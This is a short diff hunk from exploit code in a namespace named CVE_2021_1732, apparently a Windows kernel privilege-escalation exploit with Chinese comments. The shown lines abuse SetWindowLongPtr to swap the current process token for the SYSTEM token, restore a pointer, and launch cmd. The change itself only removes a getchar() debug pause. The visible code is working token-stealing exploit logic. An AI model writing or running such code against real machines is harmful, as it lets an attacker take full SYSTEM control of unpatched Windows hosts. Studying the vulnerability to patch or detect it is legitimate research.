@@ -182,7 +182,6 @@ namespace CVE_2021_1732
                 (LONG_PTR)currentTokenAddr);//1.设置tagWNDK_1->pExtraByte为当前进程Eprocess token的地址
             printf("[debug] old: 0x%p\n", old);
             SetWindowLongPtr(g_HWNDs[1], 0, (LONG_PTR)systemTokenVal); //设置正常tagWNDK_1->pExtraByte为system token值
-            getchar();
             SetWindowLongPtr(g_HWNDs[0], tag1_reverseBaseOffset - tag0_extraByteAddr + offset::tagWND::tagWNDK::pExtraByte, old); //恢复tagWNDK_1->pExtraByte
             system("cmd");
         }
